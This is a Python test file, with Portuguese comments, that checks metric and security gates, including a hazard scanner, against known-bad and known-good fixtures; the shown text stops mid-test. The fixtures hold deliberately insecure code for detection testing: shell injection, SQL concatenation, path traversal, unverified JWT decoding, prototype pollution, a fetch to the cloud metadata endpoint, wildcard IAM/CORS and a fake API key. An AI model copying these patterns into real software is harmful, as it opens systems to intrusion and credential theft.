#!/usr/bin/env python3
"""
Canários bilaterais dos portões métricos (spec: docs/designs/portoes-metricos-ub.md).

Cada portão precisa provar as duas coisas:
  (a) reprova um caso comprovadamente ruim (known-dirty fixture);
  (b) aprova o caminho permitido — um portão que reprova tudo não serve.

Cobertura: assertless_scan, crap_score, ratchet, fence_check, tornado_scan
+ coletores (churn/metrics/edges) + disciplina de exit 2 em entrada malformada.
"""
from pathlib import Path
import hashlib
import json
import subprocess
import sys
import tempfile

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8")

repo_root = Path(__file__).resolve().parents[1]
MET = repo_root / "scripts" / "metricas"
SIGNALS = repo_root / "scripts" / "repo_signals.py"


def run(script: Path, *args, input_text=None, cwd=None):
    res = subprocess.run(
        [sys.executable, str(script), *map(str, args)],
        capture_output=True, text=True, input=input_text, cwd=cwd,
    )
    return res.returncode, (res.stdout or "") + (res.stderr or "")


def run_all_metric_canaries() -> tuple[int, int, list[str]]:
    passed = total = 0
    reports = []

    def expect(name, cond, detail=""):
        nonlocal passed, total
        total += 1
        if cond:
            passed += 1
            reports.append(f"[PASSOU] {name}")
        else:
            reports.append(f"[FALHOU] {name} {detail}")

    with tempfile.TemporaryDirectory() as td:
        t = Path(td)

        # --- 1/2 assertless: dirty reprova, limpo aprova ---
        dirty = t / "test_dirty.py"
        dirty.write_text(
            "def test_sem_assert():\n    x = 1 + 1\n    print(x)\n", encoding="utf-8")
        code, _ = run(MET / "assertless_scan.py", dirty)
        expect("Canário M1: assertless reprova teste sem asserção", code == 1)
        clean = t / "test_clean.py"
        # Asserção real (resultado de chamada — não tautologia constante;
        # `assert 1 + 1 == 2` é tautologia que const_truth agora detecta).
        clean.write_text(
            "def test_ok():\n    resultado = sum([1, 1])\n    assert resultado == 2\n",
            encoding="utf-8")
        code, _ = run(MET / "assertless_scan.py", clean)
        expect("Canário M2: assertless aprova teste com asserção", code == 0)

        # --- 3/4 crap_score: breach reprova, ok aprova ---
        code, _ = run(MET / "crap_score.py", "--threshold", "6",
                      input_text="bar\t20\t0\n")
        expect("Canário M3: crap reprova função complexa sem cobertura", code == 1)
        code, _ = run(MET / "crap_score.py", "--threshold", "6",
                      input_text="foo\t3\t95\n")
        expect("Canário M4: crap aprova função simples coberta", code == 0)

        # --- 5/6 ratchet: piora reprova, melhora aprova ---
        base = t / "base.tsv"
        base.write_text("src/a.py\t3.0\t4\t80\n", encoding="utf-8")
        worse = t / "worse.tsv"
        worse.write_text("src/a.py\t25.0\t12\t40\n", encoding="utf-8")
        better = t / "better.tsv"
        better.write_text("src/a.py\t2.0\t3\t85\n", encoding="utf-8")
        code, _ = run(MET / "ratchet.py", "--baseline", base, "--current", worse)
        expect("Canário M5: ratchet reprova arquivo que piorou", code == 1)
        code, _ = run(MET / "ratchet.py", "--baseline", base, "--current", better)
        expect("Canário M6: ratchet aprova arquivo que melhorou", code == 0)

        # --- 7/8 fence: outward reprova, inward aprova ---
        fence = t / "fence.json"
        fence.write_text(json.dumps({
            "layers": ["ui", "nucleo", "executores"],
            "modules": {"src/ui": "ui", "src/core": "nucleo", "src/exec": "executores"},
        }), encoding="utf-8")
        bad = t / "edges_bad.json"
        bad.write_text(json.dumps(
            [{"from": "src/exec/x.py", "to": "src/ui/y.py"}]), encoding="utf-8")
        good = t / "edges_good.json"
        good.write_text(json.dumps(
            [{"from": "src/ui/y.py", "to": "src/core/z.py"},
             {"from": "src/core/z.py", "to": "src/exec/x.py"}]), encoding="utf-8")
        code, _ = run(MET / "fence_check.py", fence, bad)
        expect("Canário M7: fence reprova dependência outward (exec→ui)", code == 1)
        code, _ = run(MET / "fence_check.py", fence, good)
        expect("Canário M8: fence aprova dependência inward (ui→core→exec)", code == 0)

        # --- 9/10 tornado: tendência subindo reprova, plana aprova ---
        rising = "c1\t2\nc2\t2\nc3\t3\nc4\t2\nc5\t3\nc6\t2\nc7\t3\nc8\t2\nc9\t3\nc10\t2\n" \
                 "c11\t9\nc12\t10\nc13\t11\nc14\t9\nc15\t12\n"
        flat = "c1\t2\nc2\t3\nc3\t2\nc4\t3\nc5\t2\nc6\t3\nc7\t2\nc8\t3\nc9\t2\nc10\t3\n" \
               "c11\t2\nc12\t3\nc13\t2\nc14\t3\nc15\t2\n"
        code, _ = run(MET / "tornado_scan.py", "--order", "oldest-first", input_text=rising)
        expect("Canário M9: tornado reprova amplificação crescente", code == 1)
        code, _ = run(MET / "tornado_scan.py", "--order", "oldest-first", input_text=flat)
        expect("Canário M10: tornado aprova tendência estável", code == 0)

        # --- 11: entrada malformada = exit 2 (não-veredito), nunca verde ---
        code, _ = run(MET / "crap_score.py", input_text="lixo sem tab\n")
        expect("Canário M11: entrada malformada sai 2 (fail closed)", code == 2)

        # --- 12/13/14 coletores: churn, metrics, edges produzem sinal real ---
        proj = t / "proj"
        (proj / "src").mkdir(parents=True)
        (proj / "src" / "a.py").write_text(
            "import b\n\ndef f(x):\n    if x and x > 0 or x == -1:\n        return 1\n"
            "    for i in range(3):\n        x += i\n    return x\n", encoding="utf-8")
        (proj / "src" / "b.py").write_text("CONST = 1\n", encoding="utf-8")

        code, out = run(SIGNALS, "metrics", "--root", proj)
        expect("Canário M12: metrics emite linha por função com complexidade",
               code == 0 and "a.py::f:3\t" in out)

        code, out = run(SIGNALS, "edges", "--root", proj)
        found = code == 0 and json.loads(out) if code == 0 else []
        expect("Canário M13: edges encontra aresta interna a.py→b.py",
               any(e["from"].endswith("a.py") and e["to"].endswith("b.py") for e in found))

        # churn precisa de git: repo temporário mínimo
        subprocess.run(["git", "init"], cwd=proj, capture_output=True, check=True)
        subprocess.run(["git", "config", "user.name", "T"], cwd=proj, check=True)
        subprocess.run(["git", "config", "user.email", "t@t"], cwd=proj, check=True)
        subprocess.run(["git", "add", "-A"], cwd=proj, check=True)
        subprocess.run(["git", "commit", "-m", "c1"], cwd=proj,
                       capture_output=True, check=True)
        code, out = run(SIGNALS, "churn", "--repo", proj, "--order", "oldest-first")
        expect("Canário M14: churn emite 1 commit com 2 arquivos",
               code == 0 and out.strip().endswith("\t2"))

        # --- 15: fence com edges=[] é não-veredito (exit 2), nunca GREEN ---
        empty = t / "edges_empty.json"
        empty.write_text("[]", encoding="utf-8")
        code, out = run(MET / "fence_check.py", fence, empty)
        expect("Canário M15: fence edges=[] sai 2 (falso-verde eliminado)",
               code == 2 and "GREEN" not in out)

        # --- 16/17 assertless poliglota: .test.ts sujo reprova, limpo aprova ---
        tsproj = t / "tsproj"
        (tsproj / "src").mkdir(parents=True)
        ts_dirty = tsproj / "src" / "x.test.ts"
        ts_dirty.write_text(
            'import { describe, it, expect } from "vitest";\n'
            'describe("s", () => {\n'
            '  it("fantasma", () => { const x = 1 + 1; });\n'
            '  it("mock only", () => { const m = vi.fn(); m(); '
            'expect(m).toHaveBeenCalledTimes(1); });\n'
            '  it("real", () => { expect(1 + 1).toBe(2); });\n'
            "});\n", encoding="utf-8")
        code, out = run(MET / "assertless_scan.py", ts_dirty)
        expect("Canário M16: assertless .test.ts reprova fantasma+mock (exit 1)",
               code == 1 and "NO-ASSERTION" in out and "MOCK-ONLY" in out)
        ts_clean = tsproj / "src" / "y.test.ts"
        ts_clean.write_text(
            'import { it, expect } from "vitest";\n'
            'it("real", () => { expect(40 + 2).toBe(42); });\n'
            'it("timeout vitest", { timeout: 999 }, () => {'
            ' expect(1).toBe(1); });\n', encoding="utf-8")
        code, _ = run(MET / "assertless_scan.py", ts_clean)
        expect("Canário M17: assertless .test.ts aprova teste com asserção",
               code == 0)

        # --- 18/19 metrics+edges em TypeScript ---
        (tsproj / "src" / "helper.ts").write_text(
            "export function pick(xs: number[]): number {\n"
            "  if (xs.length === 0) return 0;\n"
            "  for (const x of xs) { if (x > 0 && x < 9 || x === 99) return x; }\n"
            "  return -1;\n}\n", encoding="utf-8")
        (tsproj / "src" / "main.ts").write_text(
            'import { pick } from "./helper.js";\n'
            "export const run = () => pick([1]);\n", encoding="utf-8")
        code, out = run(SIGNALS, "metrics", "--root", tsproj)
        expect("Canário M18: metrics emite funções .ts (pick+run, ignora .test.ts)",
               code == 0 and "helper.ts::pick" in out and "run" in out
               and ".test.ts" not in out)
        code, out = run(SIGNALS, "edges", "--root", tsproj)
        ts_edges = json.loads(out) if code == 0 else []
        expect("Canário M19: edges resolve ./helper.js → helper.ts",
               any(e["to"].endswith("helper.ts") for e in ts_edges))

        # --- 20: churn conta commit binário (numstat "-\t-") ---
        (proj / "bin.dat").write_bytes(b"\x00\x01\x02\xff\xfe")
        subprocess.run(["git", "add", "-A"], cwd=proj, check=True,
                       capture_output=True)
        subprocess.run(["git", "commit", "-m", "bin"], cwd=proj, check=True,
                       capture_output=True)
        code, out = run(SIGNALS, "churn", "--repo", proj, "--order", "oldest-first")
        rows = [l for l in out.splitlines() if "\t" in l]
        expect("Canário M20: churn conta binário e nunca emite count=0",
               code == 0 and len(rows) == 2
               and all(int(r.split("\t")[-1]) >= 1 for r in rows))

        # --- 21..24: load_coverage nos 4 formatos de mercado ---
        cov_cases = {
            "cov_py.json": (json.dumps({"files": {"src/a.py": {"summary":
                            {"percent_covered": 88.5}}}}), "a.py", 88),
            "cov_summary.json": (json.dumps({"total": {"lines": {"pct": 70}},
                                 "src/helper.ts": {"lines": {"pct": 77.4}}}),
                                 "helper.ts", 77),
            "cov_final.json": (json.dumps({"src/helper.ts":
                               {"s": {"0": 1, "1": 1, "2": 0, "3": 2}}}),
                               "helper.ts", 75),
            "cov.info": ("TN:\nSF:src/helper.ts\nLF:8\nLH:6\nend_of_record\n",
                         "helper.ts", 75),
        }
        for i, (fname, (content, needle, pct)) in enumerate(sorted(cov_cases.items())):
            cf = t / fname
            cf.write_text(content, encoding="utf-8")
            code, out = run(SIGNALS, "metrics", "--root", tsproj if "ts" in needle else proj,
                            "--coverage", cf)
            hit = [l for l in out.splitlines() if needle in l and f"\t{pct}" in l]
            expect(f"Canário M{21+i}: coverage {fname} alimenta metrics ({pct}%)",
                   code == 0 and bool(hit))

        # --- 25: varredura poda node_modules ---
        nm = tsproj / "node_modules" / "dep"
        nm.mkdir(parents=True)
        (nm / "junk.ts").write_text("export function junk() { return 1; }\n",
                                    encoding="utf-8")
        code, out = run(SIGNALS, "metrics", "--root", tsproj)
        expect("Canário M25: metrics poda node_modules",
               code == 0 and "node_modules" not in out)

        # --- 26: aspas simples no fim da linha + 'src/*' não corrompem o lexer ---
        sq = tsproj / "src" / "sq.test.ts"
        sq.write_text(
            "import { join } from 'path';\n"
            "import { tmpdir } from 'os';\n"
            "it('aspas simples', () => {\n"
            "  const p = join(tmpdir(), 'vc-blender-'));\n"
            "  expect(p).toContain('vc-blender-');\n"
            "});\n"
            "it('glob em aspas', () => { expect('src/*').toBe('src/*'); });\n",
            encoding="utf-8")
        code, out = run(MET / "assertless_scan.py", sq)
        expect("Canário M26: 'aspas simples' no fim da linha não corrompe lexer",
               code == 0 and "2 test function(s)" in out)

        # --- 27: template literal aninhado ${`...`} ---
        tpl = tsproj / "src" / "tpl.test.ts"
        tpl.write_text(
            "it('aninhado', () => {\n"
            "  const s = { title: 'a', status: 'b', error: 'e' };\n"
            "  const t = `${s.title}:${s.status}${s.error ? ` (${s.error})` : ''}`;\n"
            "  expect(t).toContain('a');\n"
            "});\n"
            "it('depois do template', () => { expect(1).toBe(1); });\n",
            encoding="utf-8")
        code, out = run(MET / "assertless_scan.py", tpl)
        expect("Canário M27: template aninhado preserva teste seguinte",
               code == 0 and "2 test function(s)" in out)

        # --- 28/29: Go multi-retorno e TS genérico <T> nas métricas ---
        poly2 = t / "poly2"
        (poly2 / "src").mkdir(parents=True)
        (poly2 / "src" / "parse.go").write_text(
            "package p\n"
            'import "strconv"\n'
            "func Parse(s string) (int, error) {\n"
            "  if s == \"\" {\n    return 0, strconv.ErrSyntax\n  }\n"
            "  return strconv.Atoi(s)\n}\n", encoding="utf-8")
        (poly2 / "src" / "gen.ts").write_text(
            "export async function wrap<T extends object>(x: T): Promise<T> {\n"
            "  if (x && typeof x === 'object' || !x) return x;\n"
            "  return x;\n}\n", encoding="utf-8")
        (poly2 / "src" / "m.rs").write_text(
            "use crate::a::b::Simbolo;\n"
            "fn calc(x: i32) -> i32 {\n"
            "  match x { 0 => 1, _ => 2 }\n}\n", encoding="utf-8")
        code, out = run(SIGNALS, "metrics", "--root", poly2)
        expect("Canário M28: metrics vê Go (int, error) e TS <T> e Rust match",
               code == 0 and "Parse" in out and "wrap" in out and "calc" in out)
        calc_row = [l for l in out.splitlines() if "calc" in l]
        expect("Canário M29: match Rust conta complexidade (>=2)",
               bool(calc_row) and int(calc_row[0].split("\t")[1]) >= 2)

        # --- 30: edges './tela.service' → tela.service.ts ---
        (poly2 / "src" / "ui").mkdir()
        (poly2 / "src" / "ui" / "tela.service.ts").write_text(
            "export const S = 1;\n", encoding="utf-8")
        (poly2 / "src" / "ui" / "main.ts").write_text(
            'import { S } from "./tela.service";\nexport const M = S;\n',
            encoding="utf-8")
        code, out = run(SIGNALS, "edges", "--root", poly2)
        svc = json.loads(out) if code == 0 else []
        expect("Canário M30: edges resolve ./tela.service → tela.service.ts",
               any(e["to"].endswith("tela.service.ts") for e in svc))

        # --- 31: TEST_RE não contamina path absoluto terminando em '/test/' ---
        tdir = t / "test" / "src"
        tdir.mkdir(parents=True)
        (tdir / "code.ts").write_text(
            "export function g(x: number) { if (x) return 1; return 0; }\n",
            encoding="utf-8")
        code, out = run(SIGNALS, "metrics", "--root", t / "test")
        expect("Canário M31: metrics não zera quando root se chama 'test'",
               code == 0 and "code.ts::g" in out)

        # --- 32: catch(err) { code = (err as { code?: string }).code } + expect(code) ---
        cast_catch = tsproj / "src" / "cast_catch.test.ts"
        cast_catch.write_text(
            "it('captura campo com cast TS', () => {\n"
            "  let code1 = '';\n"
            "  try { throw { code: 'E1' }; } catch (err) {\n"
            "    code1 = (err as { code?: string }).code ?? '';\n"
            "  }\n"
            "  expect(code1).toBe('E1');\n"
            "});\n",
            encoding="utf-8")
        code, out = run(MET / "assertless_scan.py", cast_catch)
        expect("Canário M32: catch com cast TS (err as ...).code inspecionado fora é aprovado",
               code == 0 and "1 test function(s)" in out)

        # --- 33: arrow TS com retorno de objeto entre parênteses sem ponto-e-vírgula ---
        (tdir / "arrow.ts").write_text(
            "export const makeObj = (x: number) => ({\n"
            "  ok: x > 0 && x < 10\n"
            "})\n",
            encoding="utf-8")
        code, out = run(SIGNALS, "metrics", "--root", t / "test")
        expect("Canário M33: metrics detecta arrow => ({ ... }) sem ';' com decisão",
               code == 0 and "arrow.ts::makeObj:1\t2\t" in out)

        # --- 34..37: hazard_scan.py bilateral (scan_path + CLI) ---
        if str(repo_root) not in sys.path:
            sys.path.insert(0, str(repo_root))
        from scripts.metricas.hazard_scan import scan_path
        from scripts.metricas.coverage_ledger import init_ledger, verify_ledger
        from scripts.metricas.contract_closure import check_contract_closure
        from scripts.metricas.assertless_scan import scan_polyglot  # noqa: F401 — ponte contratual W4

        haz_bad = t / "haz_bad.py"
        fake_sk = "sk-proj-" + ("A9b8C7d6E5f4G3h2J1k0" * 2)
        haz_bad.write_text(
            "import subprocess\n"
            f"API_KEY = '{fake_sk}'\n"
            "def run_cmd(u):\n"
            "    subprocess.run(u, shell=True)\n"
            "    q = f'SELECT * FROM users WHERE name = {u}'\n"
            "    return q\n",
            encoding="utf-8")
        sc_cnt, fnds, _ = scan_path(haz_bad)
        rules_found = {r for r, _, _, _ in fnds}
        expect("Canário M34: hazard_scan reprova HARDCODED-SECRET + SHELL-INJECTION + SQL-CONCAT",
               sc_cnt == 1 and {"HARDCODED-SECRET", "SHELL-INJECTION", "SQL-CONCAT"} <= rules_found)

        haz_good = t / "haz_good.py"
        haz_good.write_text(
            "# Exemplo documental AWS: AKIAIOSFODNN7EXAMPLE e sk-proj-1234567890123456789012345 em comentario\n"
            "import subprocess\n"
            "AWS_DOC = 'AKIAIOSFODNN7EXAMPLE'\n"
            "def safe_cmd(arg: str):\n"
            "    subprocess.run(['ffmpeg', '-i', arg], shell=False, check=True)\n"
            "    subprocess.run('git status', shell=True)  # hazard-ok: SHELL-INJECTION — comando fixo auditado\n",
            encoding="utf-8")
        code, out = run(MET / "hazard_scan.py", haz_good)
        expect("Canário M35: hazard_scan aprova spawn seguro, AKIA documental, comentário '#' e hazard-ok com razão",
               code == 0 and "0 finding(s)" in out)

        haz_bad_sup = t / "haz_badsup.ts"
        haz_bad_sup.write_text(
            "export function makeToken(secret: string) {\n"
            "  return Math.random().toString(36) + secret; // hazard-ok\n"
            "}\n",
            encoding="utf-8")
        code, out = run(MET / "hazard_scan.py", haz_bad_sup)
        expect("Canário M36: hazard_scan reprova WEAK-CRYPTO em função de token e hazard-ok sem motivo",
               code == 1 and "UNJUSTIFIED-SUPPRESSION" in out and "WEAK-CRYPTO" in out)

        haz_trav = t / "haz_trav.ts"
        haz_trav.write_text(
            "import { readFileSync } from 'fs';\n"
            "import { exec } from 'child_process';\n"
            "export async function handleReq(req: any, items: string[]) {\n"
            "  await Promise.all(items.map(x => exec(x)));\n"
            "  return readFileSync(req.query.file);\n"
            "}\n",
            encoding="utf-8")
        code, out = run(MET / "hazard_scan.py", haz_trav)
        expect("Canário M37: hazard_scan reprova PATH-TRAVERSAL e UNBOUNDED-CONCURRENCY",
               code == 1 and "PATH-TRAVERSAL" in out and "UNBOUNDED-CONCURRENCY" in out)

        # --- 38..40: coverage_ledger.py bilateral (init_ledger + verify + render-gaps) ---
        led_proj = t / "led_proj"
        (led_proj / "src").mkdir(parents=True, exist_ok=True)
        (led_proj / "src" / "a.ts").write_text("export function a(x: number) { return x + 1; }\n", encoding="utf-8")
        (led_proj / "src" / "b.ts").write_text("export function b(y: number) { return y * 2; }\n", encoding="utf-8")
        led_file = t / "ledger.json"
        init_ledger(led_proj, led_file, profile="standard")
        code, out = run(MET / "coverage_ledger.py", "verify", led_file)
        expect("Canário M38: coverage_ledger reprova unidades pending logo após init",
               code == 1 and "PENDING-UNIT" in out)

        led_data = json.loads(led_file.read_text(encoding="utf-8"))
        for u in led_data["units"]:
            u["status"] = "covered"
            u["checks"] = [{
                "agent_id": "sherlock-1",
                "method": "source",
                "invariant": "função pura sem I/O externo",
                "result": "ok",
                "assumptions": [{"text": "caller valida tipo numérico", "status": "unenforced"}],
            }]
        led_data["findings"] = [{
            "id": "F-1",
            "status": "needs_validation",
            "severity": None,
            "blockers": "WAF externo fora do repo",
            "validation_plan": "inspecionar config Cloudflare",
        }]
        led_file.write_text(json.dumps(led_data), encoding="utf-8")
        code, out = run(MET / "coverage_ledger.py", "verify", led_file)
        code_g, out_g = run(MET / "coverage_ledger.py", "render-gaps", led_file)
        expect("Canário M39: coverage_ledger aprova 100% coberto + needs_validation sem severity e renderiza gaps",
               code == 0 and code_g == 0 and "WAF externo fora do repo" in out_g and '"unenforced_assumptions": 2' in out)

        # Modifica a.ts no disco -> deve reprovar como STALE-HASH
        (led_proj / "src" / "a.ts").write_text("export function a(x: number) { return x + 999; }\n", encoding="utf-8")
        code, out = run(MET / "coverage_ledger.py", "verify", led_file)
        expect("Canário M40: coverage_ledger detecta mutação pós-auditoria (STALE-HASH)",
               code == 1 and "STALE-HASH" in out)

        # --- 41..43: contract_closure.py bilateral ---
        cc_proj = t / "cc_proj"
        (cc_proj / "src").mkdir(parents=True, exist_ok=True)
        (cc_proj / "src" / "main.ts").write_text(
            "export function buildClip() { return 1; }\n"
            "ipcMain.handle('clips:bake', () => {});\n", encoding="utf-8")
        (cc_proj / "src" / "preload.ts").write_text(
            "import { buildClip } from './main';\n"
            "export const api = () => ipcRenderer.invoke('clips:bake') + buildClip();\n", encoding="utf-8")
        spec_ok = cc_proj / "spec_ok.md"
        spec_ok.write_text(
            "# Spec\n## 4. Escopo Declarado\n- `src/main.ts`\n- `src/preload.ts`\n"
            "## 5. Pontes de Contrato\n"
            "- ponte: `src/main.ts::buildClip -> src/preload.ts`\n"
            "- ponte: `src/main.ts::\"clips:bake\" -> src/preload.ts`\n",
            encoding="utf-8")
        ok_cc, errs_cc = check_contract_closure(spec_ok, cc_proj)
        expect("Canário M41: contract_closure aprova escopo completo + ponte identificador + ponte canal IPC",
               ok_cc and not errs_cc)

        spec_bad = cc_proj / "spec_bad.md"
        spec_bad.write_text(
            "# Spec\n## 4. Escopo Declarado\n- `src/main.ts`\n- `src/esquecido.ts`\n"
            "## 5. Pontes de Contrato\n"
            "- ponte: `src/main.ts::\"clips:inexistente\" -> src/preload.ts`\n",
            encoding="utf-8")
        code, out = run(MET / "contract_closure.py", "--spec", spec_bad, "--repo", cc_proj)
        expect("Canário M42: contract_closure reprova arquivo declarado faltando e canal IPC desconectado",
               code == 1 and "MISSING-DECLARED-FILE" in out and "BROKEN-BRIDGE-STRING" in out)

        # --- 43..45: henke_router.py bilateral ---
        ROUTER = repo_root / "scripts" / "henke_router.py"
        code, out = run(ROUTER, "--prompt", "audita a segurança desse projeto e caça vulnerabilidades")
        r_sec = json.loads(out) if code == 0 else {}
        sec_skills = [s["name"] for s in r_sec.get("skills", [])]
        expect("Canário M43: henke_router seleciona henke-audit-seguranca em modo ANALISAR/SHERLOCK",
               code == 0 and r_sec.get("mode") == "ANALISAR" and r_sec.get("archetype") == "SHERLOCK"
               and "henke-audit-seguranca" in sec_skills)

        code, out = run(ROUTER, "--prompt", "como funciona um deploy na nuvem?")
        r_q = json.loads(out) if code == 0 else {}
        q_skills = [s["name"] for s in r_q.get("skills", [])]
        expect("Canário M44: henke_router veta EXECUTAR em pergunta sobre deploy e exige human_auth",
               code == 0 and r_q.get("mode") == "ANALISAR" and r_q.get("requires_human_auth") is True
               and "henke-ops-deploy" not in q_skills)

        code, out = run(ROUTER, "--prompt", "qual a receita de bolo de cenoura?")
        r_none = json.loads(out) if code == 0 else {}
        expect("Canário M45: henke_router devolve 0 skills (confidence=none, exit 0) quando fora de escopo",
               code == 0 and r_none.get("confidence") == "none" and r_none.get("skills") == [])

        # --- 46..51: Wave 2.5 Multi-Cloud IaC, Pentest Red Team & Roteamento 53 Skills ---
        iac_bad = t / "main.tf"
        iac_bad.write_text(
            'resource "aws_iam_policy" "bad" {\n'
            '  policy = jsonencode({ Effect = "Allow", Action = "*", Resource = "*" })\n'
            '}\n'
            'resource "google_storage_bucket_iam_member" "pub" {\n'
            '  role = "roles/owner"\n'
            '  member = "allUsers"\n'
            '}\n',
            encoding="utf-8")
        dc_bad = t / "docker-compose.yml"
        dc_bad.write_text("services:\n  app:\n    privileged: true\n", encoding="utf-8")
        sc_iac, fnds_iac, _ = scan_path(iac_bad)
        _, fnds_dc, _ = scan_path(dc_bad)
        iac_rules = {r for r, _, _, _ in fnds_iac + fnds_dc}
        expect("Canário M46: hazard_scan reprova IaC Multi-Cloud (CLOUD-IAM-WILDCARD, CLOUD-BUCKET-PUBLIC, DOCKER-ESCALATED)",
               sc_iac == 1 and {"CLOUD-IAM-WILDCARD", "CLOUD-BUCKET-PUBLIC", "DOCKER-ESCALATED"} <= iac_rules)

        # Controle IaC: package.json com '*' e wrangler.toml limpo não disparam falso-positivo
        pkg_clean = t / "package.json"
        pkg_clean.write_text('{"name": "app", "dependencies": {"foo": "*"}}\n', encoding="utf-8")
        wrangler_clean = t / "wrangler.toml"
        wrangler_clean.write_text('# Action = "*" em comentario\nname = "meu-worker"\nmain = "src/index.ts"\n', encoding="utf-8")
        sc_pkg, fnds_pkg, _ = scan_path(pkg_clean)
        sc_wrg, fnds_wrg, _ = scan_path(wrangler_clean)
        expect("Canário M47: hazard_scan ignora package.json com '*' e aprova wrangler.toml limpo",
               sc_pkg == 0 and fnds_pkg == [] and sc_wrg == 1 and fnds_wrg == [])

        pentest_bad = t / "pentest_bad.ts"
        pentest_bad.write_text(
            "const cors = { origin: '*', credentials: true };\n"
            "export async function authHandler(req: any, token: string, payload: any) {\n"
            "  payload['__proto__'].isAdmin = true;\n"
            "  const user = jwt.decode(token);\n"
            "  const meta = await fetch('http://169.254.169.254/latest/meta-data/');\n"
            "  const ext = await fetch(req.query.targetUrl);\n"
            "  return db.orders.findById(req.params.id);\n"
            "}\n",
            encoding="utf-8")
        _, fnds_pt, _ = scan_path(pentest_bad)
        pt_rules = {r for r, _, _, _ in fnds_pt}
        expect("Canário M48: hazard_scan reprova IDOR-NO-OWNERSHIP, SSRF-UNVALIDATED, JWT-NONE-OR-UNVERIFIED, CORS-CRED-WILDCARD, PROTO-POLLUTION e IMDS-V1",
               {"IDOR-NO-OWNERSHIP", "SSRF-UNVALIDATED", "JWT-NONE-OR-UNVERIFIED", "CORS-CRED-WILDCARD", "PROTO-POLLUTION", "IMDS-V1"} <= pt_rules)

        pentest_good = t / "pentest_good.ts"
        pentest_good.write_text(
            "export async function getOrderSafe(req: any, app: any, token: string) {\n"
            "  app.get('/health', () => 'ok');\n"
            "  const verified = jwt.verify(token, process.env.SECRET);\n"
            "  const parsed = new URL(req.query.url);\n"
            "  if (parsed.hostname === 'api.exemplo.com') { await fetch(parsed.toString()); }\n"
            "  return db.orders.findOne({ where: { id: req.params.id, userId: req.user.id } });\n"
            "}\n",
            encoding="utf-8")
        _, fnds_pt_ok, _ = scan_path(pentest_good)
        expect("Canário M49: hazard_scan aprova rota com jwt.verify, new URL hostname check, ownership userId e app.get()",
               fnds_pt_ok == [])

        code, out = run(ROUTER, "--prompt", "faz um pentest e red team local procurando IDOR e race condition")
        r_pt = json.loads(out) if code == 0 else {}
        pt_skills = [s["name"] for s in r_pt.get("skills", [])]
        expect("Canário M50: henke_router seleciona henke-audit-pentest e exclui henke-audit-seguranca via when_not/disambiguation",
               code == 0 and pt_skills and pt_skills[0] == "henke-audit-pentest" and "henke-audit-seguranca" not in pt_skills)

        code_c, out_c = run(ROUTER, "--prompt", "desenha a arquitetura cloud na AWS e Google Cloud com menor privilegio IAM e OIDC")
        r_cl = json.loads(out_c) if code_c == 0 else {}
        cl_skills = [s["name"] for s in r_cl.get("skills", [])]
        code_z, out_z = run(ROUTER, "--prompt", "cria o contrato formal da API com Zod e OpenAPI validando schemas compartilhados")
        r_zd = json.loads(out_z) if code_z == 0 else {}
        zd_skills = [s["name"] for s in r_zd.get("skills", [])]
        expect("Canário M51: henke_router seleciona henke-arch-cloud (sem ops-deploy) e henke-code-contratos (sem code-ponte)",
               code_c == 0 and "henke-arch-cloud" in cl_skills and "henke-ops-deploy" not in cl_skills
               and code_z == 0 and "henke-code-contratos" in zd_skills and "henke-code-ponte" not in zd_skills)

        # --- 52..60: Wave 3a Fechamento de Furos e Alinhamento da Suíte ---
        # M52: Contrabando de supressão em string literal
        haz_smuggle = t / "haz_smuggle.py"
        haz_smuggle.write_text(
            's = "hazard-ok: SHELL-INJECTION — falso"\n'
            'subprocess.run("ls", shell=True)\n',
            encoding="utf-8")
        _, fnds_smug, _ = scan_path(haz_smuggle)
        rules_smug = {r for r, _, _, _ in fnds_smug}
        expect("Canário M52: hazard_scan reprova contrabando de supressão dentro de string literal",
               "SHELL-INJECTION" in rules_smug)

        # M53: Banimento de ALL implícito (sem regra)
        haz_no_rule = t / "haz_no_rule.py"
        haz_no_rule.write_text(
            '# hazard-ok: motivo qualquer sem regra\n'
            'import subprocess\n'
            'subprocess.run("ls", shell=True)\n',
            encoding="utf-8")
        _, fnds_norule, _ = scan_path(haz_no_rule)
        rules_norule = {r for r, _, _, _ in fnds_norule}
        expect("Canário M53: hazard_scan reprova hazard-ok sem regra explícita (banimento de ALL implícito)",
               "UNJUSTIFIED-SUPPRESSION" in rules_norule and "SHELL-INJECTION" in rules_norule)

        # M54: Máscara de código vs dados (docstrings e strings não ativam regras de código)
        haz_doc = t / "haz_doc.py"
        haz_doc.write_text(
            '"""\n'
            'Exemplo documental:\n'
            'eval("2 + 2")\n'
            'new Function("return 1")\n'
            'nodeIntegration: true\n'
            'contextIsolation: false\n'
            'subprocess.run("ls", shell=True)\n'
            '"""\n'
            'def safe_func():\n'
            '    return 42\n',
            encoding="utf-8")
        _, fnds_doc, _ = scan_path(haz_doc)
        expect("Canário M54: hazard_scan mascara docstring e string Python para regras de código",
               fnds_doc == [])

        # M55: JWT scope (jwt.verify em uma função não isenta outra)
        haz_jwt_scope = t / "haz_jwt_scope.ts"
        haz_jwt_scope.write_text(
            'export function safeLogin(token: string) {\n'
            '  return jwt.verify(token, "secret");\n'
            '}\n'
            'export function insecureRoute(req: any, token: string) {\n'
            '  const user = jwt.decode(token);\n'
            '  return user;\n'
            '}\n',
            encoding="utf-8")
        _, fnds_jwt_sc, _ = scan_path(haz_jwt_scope)
        rules_jwt_sc = {r for r, _, _, _ in fnds_jwt_sc}
        expect("Canário M55: hazard_scan isola escopo de jwt.verify à função onde jwt.decode é chamado",
               "JWT-NONE-OR-UNVERIFIED" in rules_jwt_sc)

        # M56: Top-level intraprocedural (inspeciona código fora de funções)
        haz_toplevel = t / "haz_toplevel.ts"
        haz_toplevel.write_text(
            'const secretToken = Math.random().toString(36);\n'
            'export const authKey = secretToken;\n',
            encoding="utf-8")
        _, fnds_tl, _ = scan_path(haz_toplevel)
        rules_tl = {r for r, _, _, _ in fnds_tl}
        expect("Canário M56: hazard_scan inspeciona código top-level para regras intraprocedurais",
               "WEAK-CRYPTO" in rules_tl)

        # M57: contract_closure reprova spec com seção de pontes vazia ou linha malformada (exit 2)
        spec_empty_br = t / "spec_empty_br.md"
        spec_empty_br.write_text(
            '# Spec\n## 4. Escopo Declarado\n- `src/main.ts`\n## 5. Pontes de Contrato\n<!-- sem pontes -->\n',
            encoding="utf-8")
        code_ebr, out_ebr = run(MET / "contract_closure.py", "--spec", spec_empty_br, "--repo", cc_proj)
